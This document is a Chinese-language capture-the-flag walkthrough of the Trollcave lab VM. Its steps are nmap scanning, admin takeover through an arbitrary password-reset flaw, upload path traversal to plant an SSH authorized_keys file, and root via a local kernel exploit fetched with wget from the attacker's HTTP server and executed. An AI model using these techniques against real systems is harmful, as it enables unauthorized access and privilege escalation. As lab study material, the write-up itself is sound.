```
nmap -sP 172.16.250.0/24
nmap -sV -sC -p- 172.16.250.131
```

```
Nmap scan report for 172.16.250.131 (172.16.250.131)
Host is up (0.00054s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:ab:d7:2e:58:74:aa:86:28:dd:98:77:2f:53:d9:73 (RSA)
|   256 57:5e:f4:77:b3:94:91:7e:9c:55:26:30:43:64:b1:72 (ECDSA)
|_  256 17:4d:7b:04:44:53:d1:51:d2:93:e9:50:e0:b2:20:4c (ED25519)
80/tcp open  http    nginx 1.10.3 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Trollcave
MAC Address: 00:0C:29:9E:27:61 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

-----------------------------------------------------------------------

<img src=".\图片\Snipaste_2022-11-21_19-42-22.png" alt="Snipaste_2022-11-21_19-42-22" style="zoom:60%;" />

**用户信息**：链接信息/user/1，可以尝试/user/2......

​                   权限为Superadmin

​                   King为管理员账号

----------------------------------------------------------------------------------------------------------

<img src=".\图片\Snipaste_2022-11-21_19-52-02.png" alt="Snipaste_2022-11-21_19-52-02" style="zoom:80%;" />

**登录信息**:无验证码，用户名对了会给与不同提示，用户名不对会给与统一错误提示

可编写python脚本爬取每一页用户的信息，可尝试登录爆破

--------------------

#### 确定源码初步渗透

[GitHub - rails/rails: Ruby on Rails](https://github.com/rails/rails/)

 发现有个修改密码的功能，而且不需要原密码

http://172.16.250.131/password_resets/new    

我们只能修改普通账户的密码，选择了一个

xer/1542576819zfY

进入会员中心时发现有文件上传的功能         

但是上传功能关闭了  File upload is currently disabled 

但是把修改链接中name的值修改为King就可以修改King密码

(http://172.16.250.131/password_resets/edit.eENtR7ARv_bGOYbiX6Sikw?name=King)

进入King的后台中可以把文件上传禁用打开

文件长传路径为[172.16.250.131/uploads/King/1](http://172.16.250.131/uploads/King/1)    但是不解析php 

可以控制上传路径，但仍不解析[172.16.250.131/2](http://172.16.250.131/2)     ../../2

思路暂停

#### 另辟蹊径

只因任意用户密码重置漏洞，已进入后台管理页面，发现文件上传功能，可控路径但后门始终无法解析

可以试试 rails 用户是否存在 如果存在可以上传 authorized_keys 到 rails 用户下的/.ssh 目录下就可以免密码登录ssh

生成ssh密匙，公钥和私钥：

```
ssh-keygen -f rails
mv rails.pub authorized_keys
```

将 authorized_key 上传到/home/rails/.ssh/  ，路径为

```
../../../../../../home/rails/.ssh/authorized_keys
```

ssh连接

```
ssh -i rails rails@172.16.250.131
```

<img src=".\图片\Snipaste_2022-11-22_14-59-41.png" alt="Snipaste_2022-11-22_14-59-41" style="zoom:80%;" />



#### 提权：

查看Ubuntu版本

```
cat /etc/lsb-release
```

```
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"
```

发现此版本Ubuntu存在本地用户提权漏洞

本地下载编译http://172.16.250.128:8001/45010，开启服务器让目标机下载45010后执行，及提权成功

本地：

```
 python3 -m http.server 8001 
 gcc 45010.c -o 45010
```

目标机：

```
wget http://172.16.250.128:8001/45010
chmod +x 45010
./45010
```

<img src=".\图片\Snipaste_2022-11-22_15-19-28.png" alt="Snipaste_2022-11-22_15-19-28" style="zoom:80%;" />

```
cat flag.txt
```

```
et tu, dragon?c0db34ce8adaa7c07d064cc1697e3d7cb8aec9d5a0c4809d5a0c4809b6be23044d15379c5
```

#### 总结：

网站信息搜集时要细心，关注URL地址的规律，在页面提取重要信息，比如：用户名、源码特征等

善于在网上寻找已知漏洞exp，rails的任意用户重置密码、Ubuntu限定版本本地用户提权

发现网站功能点问题，文件上传，可上传但不解析，可控目录

关心/home/user/.ssh/下的authorized_keys，是否可被覆盖导致ssh直接登录，ssh公钥与私钥，这点由文件上传来解决

提权时善用本机信息搜集